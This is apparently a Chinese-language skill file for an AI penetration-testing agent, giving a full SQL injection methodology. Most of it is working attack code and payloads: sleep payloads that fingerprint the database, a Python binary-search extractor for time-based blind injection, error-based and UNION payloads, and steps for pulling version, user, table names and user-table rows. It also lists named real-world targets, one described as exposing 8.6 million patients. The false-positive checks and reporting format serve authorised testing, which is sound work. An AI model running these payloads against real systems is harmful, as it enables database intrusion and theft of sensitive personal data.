---
name: sql-injection-methodology
description: "SQL注入完整方法论 — 覆盖时间盲注、布尔盲注、报错注入、UNION注入、堆叠注入、二次注入。包含DB类型判定、探测顺序、假阳性排除、数据提取、危害证明。任何出现SQL注入、盲注、注入漏洞的场景都必须使用此skill。"
priority: 10
vuln_types:
  - SQL注入
  - 盲注
  - 时间盲注
  - 布尔盲注
  - 报错注入
  - UNION注入
  - 堆叠注入
  - 二次注入
triggers:
  - sql
  - injection
  - sqli
  - blind
  - time-based
  - boolean-based
  - error-based
  - union
  - SQL注入
  - 盲注
  - 注入漏洞
synonyms:
  - sql injection
  - sqli
  - blind sql injection
  - time-based blind
  - boolean-based blind
  - error-based injection
  - union-based injection
  - stacked queries
  - second-order injection
metadata:
  tags: "sql,sqli,注入,盲注,时间盲注,布尔盲注,报错注入,union,堆叠注入,二次注入,数据库,mysql,postgresql,mssql,oracle,sqlite"
  category: discovery
  authority: "expert"
---

# SQL注入完整方法论

> **核心原则**：先判定DB类型 → 按信息获取效率选择注入方式 → 假阳性排除 → 数据提取 → 危害证明

## 🤖 Agent 工具映射

| 场景 | 优先使用的 Agent 工具 |
|------|------------------------|
| 探测SQL注入点（单引号、逻辑测试） | `proxy_replay` / `proxy_send_request` |
| 判定DB类型（4类sleep同时测试） | `proxy_send_request` |
| 布尔盲注数据提取 | `proxy_send_request` + 二分搜索 |
| 时间盲注数据提取 | `proxy_send_request` + 延迟检测 |
| 报错注入数据提取 | `proxy_send_request` + 错误解析 |
| UNION注入列数探测 | `proxy_send_request` + ORDER BY |
| 数据提取与危害证明 | `proxy_send_request` + 数据解析 |
| 固化SQL注入证据 | `checklist_mark` + `note_add` |

---

## 0. 立即执行摘要：DB类型判定 → 注入方式选择 → 假阳性排除

看到任何 `SQL注入`、`盲注`、`注入漏洞`、参数值包含单引号 `%27`、逻辑条件 `AND 1=1`、时间延迟函数时，必须进入本skill。

优先顺序：

1. **DB类型判定**（一次脚本发4类sleep，按谁生效定库）
2. **注入方式选择**（按信息获取效率排序）
3. **假阳性排除**（参数类型转换、WAF拦截、业务错误）
4. **数据提取**（version() → current_user() → 表名 → 数据）
5. **危害证明**（提取敏感数据、证明读写权限）

---

## 1. DB类型判定标准流程 (MUST)

> **实战教训**：AOMS queryAlarmInfo.do 正是靠这套顺序才确认 PostgreSQL；sqli_node2.js 因缺自检输出了30个DEL字符还没发现。

### 1.1 一次脚本发4类sleep判定DB类型

```python
# DB类型判定payload
DB_PROBE_PAYLOADS = {
    "MySQL": "' AND SLEEP(3) AND '1'='1",
    "PostgreSQL": "' AND PG_SLEEP(3) AND '1'='1",
    "MSSQL": "'; WAITFOR DELAY '0:0:3'--",
    "Oracle": "' AND DBMS_LOCK.SLEEP(1) AND '1'='1",
}
```

### 1.2 判定逻辑

```python
def detect_db_type(response_times: dict) -> str:
    """
    判定DB类型：
    - MySQL: SLEEP()生效，响应延迟≥3s
    - PostgreSQL: PG_SLEEP()生效，响应延迟≥3s
    - MSSQL: WAITFOR DELAY生效，响应延迟≥3s
    - Oracle: DBMS_LOCK.SLEEP()生效，响应延迟≥1s
    """
    for db_type, delay in response_times.items():
        if delay >= 2.5:  # 考虑网络波动
            return db_type
    return "Unknown"
```

### 1.3 探测顺序

| 顺序 | 注入方式 | 适用场景 | 信息获取效率 |
|------|---------|---------|-------------|
| 1 | 报错注入 | 有SQL报错回显 | ⭐⭐⭐⭐⭐ |
| 2 | UNION注入 | 有页面回显位 | ⭐⭐⭐⭐ |
| 3 | 布尔盲注 | True/False响应有差异 | ⭐⭐⭐ |
| 4 | 时间盲注 | 无任何回显 | ⭐⭐ |

> **先试布尔盲注（true/false响应差异），无差异再降级时间盲注。**

---

## 2. 时间盲注标准探测流程 (MUST)

### 2.1 前置条件

```python
# 时间盲注配置
SLEEP_DELAY = 5  # 延迟时间（秒）
TIME_THRESHOLD = 0.8  # 阈值比例
BASELINE_COUNT = 2  # 基线测试次数
```

### 2.2 基线测试

```python
async def baseline_test(target_url, headers, body):
    """
    基线测试：取2次响应时间均值
    """
    times = []
    for _ in range(BASELINE_COUNT):
        resp = await send_request(target_url, headers, body)
        times.append(resp.elapsed)
    return sum(times) / len(times)
```

### 2.3 阈值计算

```python
def calculate_threshold(baseline_time: float) -> float:
    """
    阈值 = baseline + 2s
    低于阈值判FALSE
    """
    return baseline_time + 2.0
```

### 2.4 二分搜索优化

```python
async def binary_extract(task, blind_tpl, expr, max_chars=50):
    """
    二分搜索提取字符串
    - 单次pg_sleep放脚本最后/单测，避免累计超时
    - 用0.5s而非1s加快二分
    - 阈值 = baseline + 2s
    """
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@._-/:; "
    extracted = []
    
    for pos in range(1, max_chars + 1):
        low, high = 32, 126  # ASCII可打印字符范围
        found_char = None
        
        while low <= high:
            mid = (low + high) // 2
            # 测试是否大于mid
            payload = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))>{mid},SLEEP(0.5),0)-- -"
            resp = await send_request(task, payload)
            
            if resp.elapsed >= threshold:
                low = mid + 1
            else:
                # 测试是否等于mid
                payload_eq = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))={mid},SLEEP(0.5),0)-- -"
                resp_eq = await send_request(task, payload_eq)
                
                if resp_eq.elapsed >= threshold:
                    found_char = chr(mid)
                    break
                else:
                    high = mid - 1
        
        if found_char:
            extracted.append(found_char)
        else:
            break  # 字符串结束
    
    return "".join(extracted)
```

### 2.5 全FALSE自检 (CRITICAL)

```python
def validate_extraction(extracted_chars: list, binary_results: list):
    """
    提取脚本二分逻辑必须自带"全FALSE自检"：
    - 若长度二分全FALSE或字符全收敛到上界，立即报错而非输出垃圾
    """
    # 检查1：长度二分全FALSE
    if all(r == "FALSE" for r in binary_results["length"]):
        raise ExtractionError("INJECTION_NOT_CONFIRMED", "长度二分全FALSE，注入未确认")
    
    # 检查2：字符全收敛上界
    if all(c == chr(126) for c in extracted_chars):
        raise ExtractionError("EXTRACTION_CORRUPTED", "字符全收敛到上界，提取结果损坏")
    
    # 检查3：提取结果合理性
    if len(extracted_chars) == 0:
        raise ExtractionError("EXTRACTION_FAILED", "未提取到任何字符")
    
    # 检查4：字符频率异常（全是特殊字符）
    special_count = sum(1 for c in extracted_chars if not c.isalnum())
    if special_count / len(extracted_chars) > 0.5:
        raise ExtractionError("EXTRACTION_SUSPICIOUS", "特殊字符比例过高，可能提取错误")
    
    return True
```

---

## 3. 布尔盲注标准探测流程

### 3.1 响应差异判定

```python
def is_true_response(response_body: str, baseline_body: str) -> bool:
    """
    判断响应是否为True条件的响应
    """
    # 归一化响应体（剥离动态内容）
    normalized = normalize_response(response_body)
    normalized_baseline = normalize_response(baseline_body)
    
    # 计算相似度
    if not normalized and not normalized_baseline:
        return True
    if not normalized or not normalized_baseline:
        return False
    
    # 长度比较
    len_ratio = len(normalized) / max(len(normalized_baseline), 1)
    if len_ratio > 0.9:
        return True
    if len_ratio < 0.5:
        return False
    
    # Jaccard相似度
    tokens1 = set(normalized.split())
    tokens2 = set(normalized_baseline.split())
    if tokens1 and tokens2:
        jaccard = len(tokens1 & tokens2) / len(tokens1 | tokens2)
        return jaccard >= 0.85
    
    return False
```

### 3.2 动态内容剥离

```python
def normalize_response(text: str) -> str:
    """
    归一化响应体，剥离时间戳、JWT、CSRF token等动态内容
    """
    import re
    if not text:
        return ""
    
    s = text
    s = re.sub(r'\b\d{10,13}\b', '', s)  # Unix时间戳
    s = re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?', '', s)  # ISO时间
    s = re.sub(r'(csrf|nonce|_token|token|xsrf)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_\-]{16,}', '', s, flags=re.IGNORECASE)
    s = re.sub(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', '', s)  # JWT
    s = re.sub(r'\b[0-9a-f]{32,64}\b', '', s, flags=re.IGNORECASE)  # MD5/SHA hash
    s = re.sub(r'\s+', ' ', s).strip()
    return s
```

---

## 4. 假阳性排除规则 (MUST)

### 4.1 参数类型转换排除

> **实战教训**：AOMS getrolelist.do 参数被Integer.parseInt转换后入SQL，单引号/OR均触发500但不是SQL报错，是假阳性。

```python
def is_type_conversion_false_positive(response: dict, param_value: str) -> bool:
    """
    参数强制类型转换排除法
    """
    # 条件1：参数是纯数字
    if param_value.isdigit():
        # 条件2：响应是500错误
        if response.status_code == 500:
            # 条件3：响应中无SQL报错特征
            sql_errors = ["SQL syntax", "MySQL", "PostgreSQL", "ORA-", "sqlite"]
            if not any(err in response.text for err in sql_errors):
                # 条件4：响应包含类型转换错误
                type_errors = ["parseInt", "NumberFormatException", "Invalid input", "类型转换"]
                if any(err in response.text for err in type_errors):
                    return True  # 类型转换截断，非注入
    return False
```

### 4.2 WAF拦截识别

```python
def is_waf_blocked(response: dict) -> bool:
    """
    检测WAF拦截页
    """
    if response.status_code in [403, 418, 429, 503]:
        waf_keywords = ["blocked", "firewall", "拦截", "forbidden", "denied", "waf"]
        return any(kw in response.text.lower() for kw in waf_keywords)
    return False
```

### 4.3 业务错误码识别

```python
def is_business_error(response: dict) -> bool:
    """
    检测业务错误码（HTTP 200但业务拒绝）
    """
    if response.status_code == 200:
        try:
            data = response.json()
            if data.get("code") in [500, 403, 401]:
                return True
            if "用户未登录" in str(data.get("message", "")):
                return True
        except:
            pass
    return False
```

### 4.4 空数据检测

```python
def is_empty_data(response: dict) -> bool:
    """
    检测空数据响应
    """
    if response.status_code == 200:
        try:
            data = response.json()
            if data.get("data") is None or data.get("data") == []:
                return True
        except:
            pass
    return False
```

---

## 5. 数据提取流程

### 5.1 信息提取优先级

| 优先级 | 信息 | SQL表达式 | 目的 |
|--------|------|----------|------|
| 1 | 数据库版本 | `VERSION()` | 证明注入可执行 |
| 2 | 当前用户 | `CURRENT_USER()` | 证明权限级别 |
| 3 | 数据库名 | `DATABASE()` | 证明可枚举 |
| 4 | 表名列表 | `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables` | 证明可读取结构 |
| 5 | 敏感表数据 | `SELECT * FROM users LIMIT 3` | 证明可读取数据 |

### 5.2 报错注入提取

```python
# 报错注入payload模板
ERROR_EXTRACT_PAYLOADS = [
    # MySQL extractvalue
    ("mysql_extractvalue", "' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -"),
    # MySQL updatexml
    ("mysql_updatexml", "' AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)-- -"),
    # PostgreSQL
    ("pg_cast", "'||(SELECT CAST(({expr}) AS text))-- -"),
    # MSSQL
    ("mssql_convert", "' AND 1=CONVERT(int,({expr}))-- -"),
]

def extract_from_error_response(body: str) -> str:
    """
    从报错注入响应中提取数据（~data~格式）
    """
    import re
    pattern = re.compile(r"~([^~]{1,200})~|XPATH syntax error.*?'([^']{1,200})'|Duplicate entry '([^']{1,200})'")
    match = pattern.search(body)
    if match:
        for g in match.groups():
            if g:
                return g.strip()
    return ""
```

### 5.3 UNION注入提取

```python
async def union_extract(task, col_count: int, echo_pos: int):
    """
    UNION注入数据提取
    """
    extraction_targets = [
        ("db_version", "VERSION()"),
        ("current_user", "CURRENT_USER()"),
        ("current_db", "DATABASE()"),
    ]
    
    extracted_data = {}
    for info_name, expr in extraction_targets:
        columns = ["NULL"] * col_count
        columns[echo_pos] = expr
        union_payload = f"' UNION SELECT {','.join(columns)}-- -"
        
        resp = await send_request(task, union_payload)
        data = find_union_data(resp.body, task.baseline_response)
        if data:
            extracted_data[info_name] = data
    
    return extracted_data
```

---

## 6. 危害证明规范

### 6.1 有效PoC必须包含

1. **DB类型证据**：证明判定的DB类型正确
2. **注入点证据**：完整HTTP请求（含认证头）
3. **数据提取证据**：version()、current_user()、数据库名
4. **影响范围说明**：可读取的表、敏感数据类型

### 6.2 危害等级判定

| 等级 | 条件 | 示例 |
|------|------|------|
| **严重** | 可读写所有数据库、可执行系统命令 | root权限 + FILE权限 |
| **高危** | 可读取敏感数据（用户表、密码表） | 提取到用户邮箱、密码哈希 |
| **中危** | 可枚举数据库结构（表名、列名） | 获取information_schema |
| **低危** | 仅证明存在注入，无法提取数据 | 仅能执行SLEEP |

---

## 7. 结果判定与误报排除

### 结果分级

- `confirmed_vuln`：有明确的DB类型判定、数据提取证据、危害证明
- `suspected_vuln`：存在SQL报错或响应差异，但未完成数据提取
- `needs_review`：缺少测试条件（无回显位、WAF拦截、网络不稳定）
- `not_vuln`：完成假阳性排除规则后无异常

### 误报排除

- 参数类型转换导致的500错误不是SQL注入
- WAF拦截页不是SQL注入
- 业务错误码（200但code:500）不是SQL注入
- 空数据响应不是SQL注入

---

## ⛔ 「最低必测自检」— 标 not_vuln/skipped 前必答

| # | 必测项 | 跳过的合法理由 |
|---|--------|---------------|
| 1 | **DB类型判定**：测试4类sleep（MySQL/PG/MSSQL/Oracle），确认DB类型 | 接口无SQL执行（静态页面） |
| 2 | **报错注入测试**：尝试extractvalue/updatexml等报错payload | 已确认无SQL报错回显 |
| 3 | **UNION注入测试**：ORDER BY探测列数，UNION SELECT找回显位 | 已确认无页面回显 |
| 4 | **布尔盲注测试**：AND 1=1 vs AND 1=2对比响应差异 | 响应无差异 |
| 5 | **时间盲注测试**：SLEEP/PG_SLEEP/WAITFOR DELAY验证延迟 | 已确认其他注入方式有效 |
| 6 | **假阳性排除**：参数类型转换、WAF拦截、业务错误码检测 | - |
| 7 | **数据提取**：version()、current_user()、数据库名 | 仅验证存在注入，不提取数据 |

---

## 输出格式

```text
[SQL注入检查]
入口/接口：GET/POST /path?param=value
DB类型：MySQL/PostgreSQL/MSSQL/Oracle/Unknown
注入方式：报错注入/UNION注入/布尔盲注/时间盲注/未确认
数据提取：version()/current_user()/数据库名/表名/数据样例
危害等级：严重/高危/中危/低危
结论：confirmed_vuln | suspected_vuln | needs_review | not_vuln
假阳性排除：类型转换/WAF拦截/业务错误/空数据/无
```

---

## 真实案例速查表

| 目标 | 漏洞 | 关键发现技巧 |
|------|------|-------------|
| AOMS queryAlarmInfo.do | PostgreSQL时间盲注 | 4类sleep判定DB类型 |
| AOMS getrolelist.do | 假阳性（类型转换） | 参数被parseInt转换后入SQL |
| 微糖主站 | SQL注入影响860W+患者 | 报错注入提取敏感数据 |

---

## ⚠️ Skill边界与逃逸

| 现场信号 | 应跳转/联动的Skill |
|---|---|
| 接口有文件上传功能 | `file-upload-methodology` |
| 接口有XXE风险 | `xxe-methodology` |
| 接口有命令注入风险 | `command-execution` |
| 接口有SSRF风险 | `exploit-ssrf` |
| 需要认证才能测试 | `auth-bypass-methodology` |
| 需要越权测试 | `idor-methodology` |

<!-- 数据源：AOMS实战经验 + WooYun漏洞数据库 + HackerOne报告 · 方法论 v1.0 -->
